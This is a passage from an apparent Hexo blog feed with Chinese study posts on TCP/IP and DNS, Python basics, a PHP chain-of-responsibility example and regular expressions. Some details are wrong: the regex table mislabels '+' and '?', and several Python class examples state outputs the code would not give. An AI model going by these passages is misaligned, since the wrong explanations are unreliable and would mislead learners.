title="与HTTP关系密切的协议:IP、TCP和DNS"></a>与HTTP关系密切的协议:IP、TCP和DNS</h3><p>IP </p><ul><li>负责传输的协议，协议的作用就是把各种数据包传送给对方，而要保证确实传送到对方，其中两个重要的条件是IP地址和MAC地址<br>ip地址可变换，MAC地址基本上不会更改，通信主要依赖MAC地址，而ARP协议可以将ip地址反查出对应的MAC地址</li></ul><p>TCP</p><ul><li>提供可靠的字节流服务，所谓的字节流服务是指将大块数据分割成以报文段为单位的数据包进行管理，而可靠的传输服务是指，能够把数据准确可靠地传给对方<br>确保数据能达到目标的原因是，TCP协议采用了三次握手策略，具体如下所示:</li></ul><p><img src="三次握手.png" alt="三次握手"></p><p>握手过程中使用了TCP的标志SYN和ACK<br>发送端首先发送一个带SYN标志的数据包给对方，接受端收到后，回传一个嗲有SYN/ACK标志的数据包以示传达确认信息。最后发送端再回传一个带ACK标志的数据包，代表握手结束.</p><p>DNS</p><ul><li>提供域名到ip地址之间得到解析服务</li></ul><h2 id="在浏览器输入url访问这个发生了什么"><a href="#在浏览器输入url访问这个发生了什么" class="headerlink" title="在浏览器输入url访问这个发生了什么?"></a>在浏览器输入url访问这个发生了什么?</h2><p>综合上述分析，这个回答再具体点,可以分为以下过程:<br><img src="整个过程.png" alt="整个过程"></p>]]></content>
      
      
      <categories>
          
          <category> http </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>七夕写给小耳朵的推文</title>
      <link href="/2017/08/30/%E5%86%99%E7%BB%99%E5%B0%8F%E8%80%B3%E6%9C%B5%E7%9A%84%E6%8E%A8%E6%96%87/"/>
      <url>/2017/08/30/%E5%86%99%E7%BB%99%E5%B0%8F%E8%80%B3%E6%9C%B5%E7%9A%84%E6%8E%A8%E6%96%87/</url>
      
        <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 推文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>python-1 必须要了解的基础</title>
      <link href="/2017/08/30/python-series1/"/>
      <url>/2017/08/30/python-series1/</url>
      
        <content type="html"><![CDATA[<p>必须要了解的基础<br><a id="more"></a></p><h2 id="python学习系列1"><a href="#python学习系列1" class="headerlink" title="python学习系列1"></a>python学习系列1</h2><h3 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a><strong>开篇</strong></h3><p>其实学习语言多了，你会发现不管学什么语言，都逃不出如下套路：</p><ul><li><p>1.怎么定义变量，是否有数据类型，怎么在控制台输出</p></li><li><p>2.如何定义函数，如何定义类，面向对象的写法是如何的？</p></li><li><p>3.如何调用外部类</p></li><li><p>4.如何读写文件，网络编程</p></li><li><p>5.如何与数据库交互</p></li><li><p>6.如何和各种第三方库交互</p></li><li><p>7.有什么比较好的框架可以使用</p></li></ul><p>上述语言仅限web后端语言，快速上手的套路无非就是有语言基础，编程经验弄懂上面这些套路，后续入门之后，我们可以再深入学习语言的特性，设计模式，以及性能调优这些。<br>讲完上述套路之后，我们根据以上的套路开始我们的python快速上手之旅，当然，最主要的是我们要结合手册弄懂上述这些知识点，然后动手做项目，看懂别人的源码，差不多就入门了。而且后端重点不在于语言本身，而在业务以及数据库上面。</p><p>python现在比较火的方向</p><ul><li>python web</li><li>python 数据分析与数据挖掘</li><li>机器学习</li></ul><h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a><strong>快速入门</strong></h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>数据类型包括整数，浮点数，字符串，布尔值，空值，list,dit,其中空值是Python里一个特殊的值，用None表示。None不能理解为0，因为0是有意义的，而None是一个特殊的空值。<br>字符串对于python是非常频繁用到的</p><h4 id="定义多行字符串"><a href="#定义多行字符串" class="headerlink" title="定义多行字符串"></a>定义多行字符串</h4><pre><code>name=hello        world</code></pre><h5 id="字符串重复"><a href="#字符串重复" class="headerlink" title="字符串重复"></a>字符串重复</h5><p>seven出现三次</p><pre><code>name=&apos;seven&apos; *3</code></pre><h5 id="字符串的长度"><a href="#字符串的长度" class="headerlink" title="字符串的长度"></a>字符串的长度</h5><pre><code>name=len(&apos;seven&apos;)</code></pre><h4 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h4><pre><code>def showName():    print inputnameshowName() ##调用</code></pre><h5 id="函数关键字参数"><a href="#函数关键字参数" class="headerlink" title="函数关键字参数"></a>函数关键字参数</h5><pre><code>def showName(*info):    print infoshowName(1,2,3)</code></pre><p>返回参数列表（1，2，3）<br>*参数名 表示可变参数，可以接受多个参数</p><pre><code>def showName(**info):    print infoshowName(x=1,y=2,z=3)</code></pre><p>返回字典<br>{‘x’:1,’y’=2,’z’=3}<br>**参数名 表示获取键值的参数</p><h4 id="列表list类型"><a href="#列表list类型" class="headerlink" title="列表list类型"></a>列表list类型</h4><p>类似于数组<br>增:<br>append</p><pre><code>classmates.append(&apos;Adam&apos;)</code></pre><p>insert</p><pre><code>classmates.insert(1, &apos;Jack&apos;)</code></pre><p>删:<br>pop</p><pre><code>classmates.pop()</code></pre><p>pop(索引)</p><pre><code>classmates.pop(1)</code></pre><p>切片:<br>类似于数组取下标，不过这边的下标可以切片</p><pre><code>L = [&apos;Michael&apos;, &apos;Sarah&apos;, &apos;Tracy&apos;, &apos;Bob&apos;, &apos;Jack&apos;]L[0:3] #返回前三个位置的元素L[0:4:2]#隔两个取一个元素</code></pre><h5 id="列表生成-range函数的使用"><a href="#列表生成-range函数的使用" class="headerlink" title="列表生成- range函数的使用"></a>列表生成- range函数的使用</h5><p>range(起始位置，结束为止，步长)<br>使用：</p><pre><code>print range(0,10,2)</code></pre><p>返回 ‘[0, 2, 4, 6, 8]’</p><h5 id="列表生成"><a href="#列表生成" class="headerlink" title="列表生成"></a>列表生成</h5><pre><code>[x * x for x in range(1, 11) if x % 2 == 0]</code></pre><p>生成: [4, 16, 36, 64, 100]</p><h5 id="map函数的使用"><a href="#map函数的使用" class="headerlink" title="map函数的使用"></a>map函数的使用</h5><p>map(函数，可迭代数据类型)<br>可迭代数据类型就是我们这里的列表</p><pre><code>def f(x):    return x * xmap(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</code></pre><p>依次遍历列表中的每个元素执行函数f，最终返回结果也是列表<br>[1, 4, 9, 16, 25, 36, 49, 64, 81]</p><h4 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h4><p>   class Seven:<br>      def <strong>init</strong>(self, inputname):<br>            self.name=inputname</p><h5 id="类里的字符串不可变"><a href="#类里的字符串不可变" class="headerlink" title="类里的字符串不可变"></a>类里的字符串不可变</h5><pre><code>class Seven:   age=9   def __init__(self, inputname):         self.name=inputname   def show(self):         print self.name         print self.age seven1=Seven(&apos;seven1&apos;) seven1.age=21 seven1.show() seven2=Seven(&apos;seven2&apos;) seven2.show()</code></pre><p>输出 seven1 21 seven2 9,但是当我们将age定义成列表的时候</p><pre><code>class Seven:   age=[]   def __init__(self, inputname):         self.name=inputname   def show(self):         print self.name         print self.age seven1=Seven(&apos;seven1&apos;) seven1.age=21 seven1.show() seven2=Seven(&apos;seven2&apos;) seven2.show()</code></pre><p>输出 seven1 [21] seven2 [21]</p><p>那么在定义的时候，让每个实例化的对象都有自己的变量，我们需要这样修改</p><pre><code>class Seven:   def __init__(self, inputname):         age=[]         self.name=inputname   def show(self):         print self.name         print self.age seven1=Seven(&apos;seven1&apos;) seven1.age=21 seven1.show() seven2=Seven(&apos;seven2&apos;) seven2.show()   </code></pre><p>输出 seven1 [21] seven2 []</p><h5 id="类的私有属性"><a href="#类的私有属性" class="headerlink" title="类的私有属性"></a>类的私有属性</h5><pre><code>class Seven:   __sex=&apos;男&apos;   def __init__(self, inputname):         age=[]         self.name=inputname   def show(self):         print self.name         print self.age seven2=Seven(&apos;seven2&apos;) seven2.show()  print seven2._Seven__sex #访问私有变量的方式</code></pre><h5 id="类的特殊属性"><a href="#类的特殊属性" class="headerlink" title="类的特殊属性"></a>类的特殊属性</h5><pre><code>class Seven:     pass</code></pre><h4 id="字典类型"><a href="#字典类型" class="headerlink" title="字典类型"></a>字典类型</h4><p>类似于关联数组</p><pre><code>seven={&apos;name&apos;:seven,&quot;age&quot;:22}seven=dict(name=&apos;seven&apos;,age=22)</code></pre><p>增:<br>增加一个不存在的key值</p><pre><code>d = {&apos;Michael&apos;: 95, &apos;Bob&apos;: 75, &apos;Tracy&apos;: 85}d[&apos;seven&apos;]=22</code></pre><p>删<br>pop(key)</p><pre><code>d = {&apos;Michael&apos;: 95, &apos;Bob&apos;: 75, &apos;Tracy&apos;: 85}d[&apos;seven&apos;]=22d.pop(&apos;seven&apos;)</code></pre><p>查:<br>get，存在就返回值，不存在就返回none或者自定义数值</p><pre><code>d = {&apos;Michael&apos;: 95, &apos;Bob&apos;: 75, &apos;Tracy&apos;: 85}d[&apos;seven&apos;]=22d.get(&apos;seven&apos;,-1)</code></pre><h4 id="模块的导入"><a href="#模块的导入" class="headerlink" title="模块的导入"></a>模块的导入</h4><pre><code>import sys</code></pre><p>也可以导入我们自定义的python模块</p><h5 id="两个内置函数"><a href="#两个内置函数" class="headerlink" title="两个内置函数"></a>两个内置函数</h5><p>locals() 以字典形式返回当前局部符号表<br>globals() 以字典形式返回当前全局符号表</p><h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><p>包目录下需要有一个文件<strong>init</strong>.py才可以导入</p><h4 id="pip的使用，安装外部模块"><a href="#pip的使用，安装外部模块" class="headerlink" title="pip的使用，安装外部模块"></a>pip的使用，安装外部模块</h4><p>安装请自行百度<br>使用方法:<br>    pip install 模块名</p><h4 id="安装虚拟环境"><a href="#安装虚拟环境" class="headerlink" title="安装虚拟环境"></a>安装虚拟环境</h4><p>为了避免库之间的版本兼容问题，一般不全局安装外部模块，只需局部模块，因此我们需要用到python的虚拟环境<br>python3.3-3.4的版本使用的是pyvenv<br>python3.5之后使用的venv<br>这里演示的版本是3.6使用的是venv<br>        python -m venv 文件夹名字<br>这里创建文件夹，然后里面有python自动生成的库文件<br>进入这个目录之后，执行 active.bat<br>然后就进入了虚拟环境，我们可以在虚拟环境像原来那样执行操作了</p><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>读取文件</p><pre><code>f=open(路径,&apos;r&apos;) #返回文件对象f.read() #返回读取的内容f.close()</code></pre><p>获取绝对全路径</p><pre><code>__file__ #获得当前文件的路径os.path.dirname() #获得文件所在的目录路径</code></pre><h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><pre><code>f = open(&apos;/Users/michael/test.txt&apos;, &apos;w&apos;)f.write(&apos;Hello, world!&apos;)</code></pre><h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><pre><code>try:    #可能会出错的代码except:    #捕捉到异常处理的地方finally:    #没有异常处理的地方</code></pre><h4 id="is与-的区别"><a href="#is与-的区别" class="headerlink" title="is与==的区别"></a>is与==的区别</h4><p>is是来判断内存地址时候一样</p><p>==判断两个元素的值是否一样</p><h4 id="with-as"><a href="#with-as" class="headerlink" title="with as"></a>with as</h4><p>这个语法是用来代替传统的try…finally语法的。<br>基本思想是with所求值的对象必须有一个<strong>enter</strong>()方法，一个<strong>exit</strong>()方法。</p><p>紧跟with后面的语句被求值后，返回对象的<strong>enter</strong>()方法被调用，这个方法的返回值将被赋值给as后面的变量。当with后面的代码块全部被执行完之后，将调用前面返回对象的<strong>exit</strong>()方法</p><pre><code>file = open(&quot;/tmp/foo.txt&quot;)  try:      data = file.read()  finally:      file.close()  </code></pre><p>如果使用with as替换</p><pre><code>with open(&quot;/tmp/foo.txt&quot;) as file:      data = file.read()  </code></pre><p>一般with as的使用方法</p><pre><code>class Sample:      def __enter__(self):          print &quot;In __enter__()&quot;          return &quot;Foo&quot;      def __exit__(self, type, value, trace):          print &quot;In __exit__()&quot;  def get_sample():      return Sample()  with get_sample() as sample:      print &quot;sample:&quot;, sample  </code></pre><p>输出</p><pre><code>In __enter__()  sample: Foo  In __exit__()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php核心学习-设计模式的学习-责任链模式</title>
      <link href="/2017/08/22/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F/"/>
      <url>/2017/08/22/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>一、什么是责任链模式</p><p>　　责任链模式是一种对象的行为模式。在责任链模式里，很多对象由每一个对象对其下家的引用而连接起来形成一条链。请求在这个链上传递，直到链上的某一个对象决定处理此请求。发出这个请求的客户端并不知道链上的哪一个对象最终处理这个请求，这使得系统可以在不影响客户端的情况下动态地重新组织和分配责任。<br>　　责任链模式的特点点主要是：<br>　　1、有多个对象共同对一个任务进行处理。<br>　　2、这些对象使用链式存储结构，形成一个链，每个对象知道自己的下一个对象。<br>　　3、一个对象对任务进行处理，可以添加一些操作后将对象传递个下一个任务。也可以在此对象上结束任务的处理，并结束任务。<br>　　3、客户端负责组装链式结构，但是客户端不需要关心最终是谁来处理了任务。<br>这些解释都是java方面的解释，不同语言，其实设计模式还是有点区别的，现在我们使用的是php实现责任链设计模式，我们使用一个场景来带入我们的设计模式学习当中，使用责任链模拟多步用户注册过程。</p><p>二、模式代码<br>用户注册处理器借口<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">UserReg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $step=<span class="string">"step1"</span>;<span class="comment">//当前状态，这个很重要</span></span><br><span class="line">    <span class="keyword">public</span> $next=<span class="keyword">false</span>;<span class="comment">//下一节点</span></span><br><span class="line">    <span class="keyword">public</span> $last=<span class="keyword">false</span>;<span class="comment">//上一节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setNextStep</span><span class="params">($object)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;next=$object;</span><br><span class="line">        $object-&gt;last=<span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stepNext</span><span class="params">($user)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//只有当user的state和自己的mystate 相等时才会处理</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user-&gt;step==<span class="keyword">$this</span>-&gt;step) <span class="comment">//代表当前状态 是自己要处理的 状态</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//判断 自己的下一个节点是否存在,如果存在则把控制权交给下一个节点</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;next)</span><br><span class="line">            &#123;</span><br><span class="line">                $user-&gt;step=<span class="keyword">$this</span>-&gt;next-&gt;step;<span class="comment">//交控制权</span></span><br><span class="line">                <span class="keyword">return</span> $user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;next)</span><br><span class="line">              <span class="keyword">return</span>  <span class="keyword">$this</span>-&gt;next-&gt;stepNext($user);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>用户注册第一步处理接口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span> <span class="keyword">extends</span> <span class="title">UserReg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $step=<span class="string">"step1"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stepNext</span><span class="params">($user)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//假设这步 需要把用户初始信息保存到数据库。这里我们保存到session</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($user==<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $user=<span class="keyword">new</span> UserEntity();</span><br><span class="line">            $user-&gt;user_name=$_POST[<span class="string">"user_name"</span>];</span><br><span class="line">            $user-&gt;user_pass=$_POST[<span class="string">"user_pass"</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">//模拟用户入库</span></span><br><span class="line">            $_SESSION[<span class="string">"user"</span>]=json_encode($user);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">         $get_user=<span class="keyword">parent</span>::stepNext($user); <span class="comment">// <span class="doctag">TODO:</span> Change the autogenerated stub</span></span><br><span class="line">        <span class="keyword">if</span>($get_user)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//模拟保存用户</span></span><br><span class="line">            $_SESSION[<span class="string">"user"</span>]=json_encode($get_user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户注册第二步处理接口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserPhone</span> <span class="keyword">extends</span> <span class="title">UserReg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $step=<span class="string">"step2"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stepNext</span><span class="params">($user)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user-&gt;user_phone=$_POST[<span class="string">'user_phone'</span>];</span><br><span class="line">        $get_user=<span class="keyword">parent</span>::stepNext($user); <span class="comment">// <span class="doctag">TODO:</span> Change the autogenerated stub</span></span><br><span class="line">        <span class="keyword">if</span>($get_user)</span><br><span class="line">        &#123;</span><br><span class="line">            $_SESSION[<span class="string">"user"</span>]=json_encode($get_user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户注册第三步接口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserSuccess</span> <span class="keyword">extends</span> <span class="title">UserReg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $step=<span class="string">"step3"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stepNext</span><span class="params">($user)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//继续执行业务</span></span><br><span class="line">        $get_user=<span class="keyword">parent</span>::stepNext($user); <span class="comment">// <span class="doctag">TODO:</span> Change the autogenerated stub</span></span><br><span class="line">        <span class="keyword">if</span>($get_user)</span><br><span class="line">            $_SESSION[<span class="string">"user"</span>]=json_encode($get_user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$userInfo=<span class="keyword">new</span> UserInfo();</span><br><span class="line">$userPhone=<span class="keyword">new</span> UserPhone();</span><br><span class="line">$userSuccess=<span class="keyword">new</span> UserSuccess();</span><br><span class="line"></span><br><span class="line">$userInfo-&gt;setNextStep($userPhone);</span><br><span class="line">$userPhone-&gt;setNextStep($userSuccess);</span><br><span class="line"></span><br><span class="line">$userInfo-&gt;stepNext(getUser());</span><br></pre></td></tr></table></figure><p>当你执行到第二步退出的时候，重新注册，系统还是从之前退出的状态继续注册，简单的模拟差不多是这样子，仅提供设计模式思想。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>第100遍学习正则表达式</title>
      <link href="/2017/08/21/%E7%AC%AC100%E9%81%8D%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2017/08/21/%E7%AC%AC100%E9%81%8D%E5%AD%A6%E4%B9%A0%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>第100遍学习正则表达式<br><a id="more"></a></p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a><strong>正则表达式</strong></h2><p>相信看到这个题目的时候，你已经对正则表达式已经学习了不下十遍了，题目可能有点夸张，但是正则确实也是很难学懂的一门工具语言，其实它也只是为了让机器读懂而已，每次学习完之后总是忘记了，很久没用看到之后总是一脸懵逼，然后重新查询手册，现在，把我重新学习正则表达式的过程记录一下，希望能够更好地运用这门工具语言。</p><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a><strong>用途</strong></h3><p>1.之前写爬虫的时候也是经常用于网页文本的匹配，处理文本<br>2.过滤敏感字符<br>3.处理字符串</p><h3 id="开始学习"><a href="#开始学习" class="headerlink" title="开始学习"></a><strong>开始学习</strong></h3><p>网上突然发现有人写了《learn regex the easy way 》,看完之后感觉涨姿势了，现整理如下，如果你有兴趣阅读，<a href="https://github.com/zeeshanu/learn-regex/blob/master/README-cn.md" target="_blank" rel="noopener">请看这里</a>，同时配合<a href="https://regex101.com/r/dmRygT/1" target="_blank" rel="noopener">练习网站</a>食用，效果最佳。<br>相信各位老司机应该看了很多遍正则的文档了吧，基础部分就直接省略。</p><h3 id="1-元字符"><a href="#1-元字符" class="headerlink" title="1.元字符"></a><strong>1.元字符</strong></h3><p>正则表达式主要依赖元字符，元字符不代表他们本身的字面意思, 他们都有特殊的含义.<br>元字符我觉得大体可以分为三类<br> <strong><em>1. 表示特殊含义的字符</em></strong></p><table><thead><tr><th style="text-align:center">元字符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">.</td><td style="text-align:center">句号匹配任意单个字符除了换行符.</td></tr><tr><td style="text-align:center">[ ]</td><td style="text-align:center">字符种类. 匹配方括号内的任意字符.</td></tr><tr><td style="text-align:center">[^ ]</td><td style="text-align:center">否定的字符种类. 匹配除了方括号里的任意字符</td></tr><tr><td style="text-align:center">(xyz)</td><td style="text-align:center">字符集, 匹配与 xyz 完全相等的字符串.</td></tr><tr><td style="text-align:center">\</td><td style="text-align:center">转义字符,用于匹配一些保留的字符 [ ] ( ) { } . * + ? ^ $ \</td></tr><tr><td style="text-align:center">\w</td><td style="text-align:center">匹配所有字母数字, 等同于 [a-zA-Z0-9_]</td></tr><tr><td style="text-align:center">\W</td><td style="text-align:center">匹配所有非字母数字, 即符号, 等同于: [^\w]</td></tr><tr><td style="text-align:center">\d</td><td style="text-align:center">匹配数字: [0-9]</td></tr><tr><td style="text-align:center">\D</td><td style="text-align:center">匹配非数字: [^\d]</td></tr><tr><td style="text-align:center">\s</td><td style="text-align:center">匹配所有空格字符, 等同于: [\t\n\f\r\p{Z}]</td></tr><tr><td style="text-align:center">\S</td><td style="text-align:center">匹配所有非空格字符: [^\s]</td></tr><tr><td style="text-align:center">\f</td><td style="text-align:center">匹配一个换页符</td></tr><tr><td style="text-align:center">\n</td><td style="text-align:center">匹配一个换行符</td></tr><tr><td style="text-align:center">\r</td><td style="text-align:center">匹配一个回车符</td></tr><tr><td style="text-align:center">\t</td><td style="text-align:center">匹配一个制表符</td></tr><tr><td style="text-align:center">\v</td><td style="text-align:center">匹配一个垂直制表符</td></tr></tbody></table><p><strong><em>2. 表示重复次数的字符</em></strong></p><table><thead><tr><th style="text-align:center">元字符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">*</td><td style="text-align:center">匹配&gt;=0个重复的在*号之前的字符.</td></tr><tr><td style="text-align:center">+</td><td style="text-align:center">标记?之前的字符为可选.0或1次</td></tr><tr><td style="text-align:center">?</td><td style="text-align:center">否定的字符种类. 匹配除了方括号里的任意字符</td></tr><tr><td style="text-align:center">{n,m}</td><td style="text-align:center">匹配num个中括号之前的字符 (n &lt;= num &lt;= m).</td></tr></tbody></table><p> <strong><em>3. 锚点</em></strong></p><table><thead><tr><th style="text-align:center">元字符</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">^</td><td style="text-align:center">用来检查匹配的字符串是否在所匹配字符串的开头.</td></tr><tr><td style="text-align:center">\$</td><td style="text-align:center">$ 号用来匹配字符是否是最后一个.</td></tr></tbody></table><h3 id="2-匹配规则"><a href="#2-匹配规则" class="headerlink" title="2.匹配规则"></a><strong>2.匹配规则</strong></h3><h4 id="1-后向引用"><a href="#1-后向引用" class="headerlink" title="1. 后向引用"></a><strong>1. 后向引用</strong></h4><p><strong><em>用于重复搜索前面某个分组匹配的文本。</em></strong></p><ul><li><p>比如:<br>\b(\w+)\b\s+\1\b,可以匹配重复的单词如，go go其中\b表示匹配单词的开始或者结束，也就是单词开始处和结束处之间的多于一个的字母或数字(\b(\w+)\b)，这个单词会被捕获到编号为1的分组中，然后是1个或几个空白符(\s+)，最后是分组1中捕获的内容（也就是前面匹配的那个单词）(\1)。</p></li><li><p>自己指定子表达式的组名:   (?&lt; Word &gt;\w+) ,使用自定义分组的时候，使用以下语法 \k &lt; Word&gt;上面例子可以改写为\b(?&lt; Word&gt;\w+)\b\s+\k&lt; Word&gt;\b</p></li></ul><h4 id="2-零断宽言"><a href="#2-零断宽言" class="headerlink" title="2. 零断宽言"></a><strong>2. 零断宽言</strong></h4><p>第一次听到这个专业术语的时候，一脸懵逼，都不太想看是什么东西了，主要是太晦涩难懂了，查阅其他资料之后，我们可以把它叫做前后关联约束(前后预查）</p><ul><li><p>前置约束<br>(?=exp)，匹配exp正则表达式前面的位置<br>(?!exp)，匹配后面跟的不是exp的位置<br>例如, 表达式 (T|t)he(?=\sfat) 匹配 The 和 the, 在括号中我们又定义了前置约束(存在) (?=\sfat) ,即 The 和 the 后面紧跟着 (空格)fat.</p><p> “(T|t)he(?=\sfat)” =&gt; The fat cat sat on the mat.<br>匹配出The</p></li><li><p>后置约束<br>(?&lt;=exp)，匹配exp后面的位置<br>(?&lt; !exp)，匹配前面不是exp的位置<br>例如, 表达式 (?&lt;=(T|t)he\s)(fat|mat) 匹配 fat 和 mat, 且其前跟着 The 或 the.</p><p> 